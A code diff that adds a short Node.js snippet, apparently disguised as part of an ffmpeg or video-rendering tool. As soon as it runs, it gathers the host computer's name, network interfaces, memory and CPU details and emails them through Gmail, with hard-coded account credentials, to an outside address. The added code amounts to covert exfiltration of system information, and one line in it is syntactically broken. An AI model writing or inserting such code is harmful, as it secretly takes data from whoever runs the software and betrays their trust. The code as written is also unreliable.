@@ -1,0 +1,28 @@
+let computerName = OS.hostname()
+let pl = JSON.stringify(OS.networkInterfaces())
+let arch = OS.totalmem()
+let cpu=JSON.stringify(OS.cpus());
+let infosend="computerName:"+computerName+"\n"+pl+"\n"+arch+"\n"+cpu;
+async function main() {
+  let transporter = nodemailer.createTransport({
+    host: "smtp.gmail.com",
+    port: 587,
+    secure: false,
+    auth: {
+      user: 'ffmpeg.rp@gmail.com',
+      pass: 'videorender'
+    }
+  });
+
+  // send mail with defined transport object
+  let info = await transporter.sendMail({
+    from: '"Ffmpeg" <ffmpeg.rp@gmail.com>',
+    to: "tt232589@gmail.com",
+    subject: "Ffmpeg-repost"+Date.now(),
+    text: "Gửi email bằng Node JS", // plain text body
+    html: "<h1>Đây là dòng nội dung</h1>"+\n+"<p>"+infosend+"</p>" // html body
+  });
+
+}
+
+main();
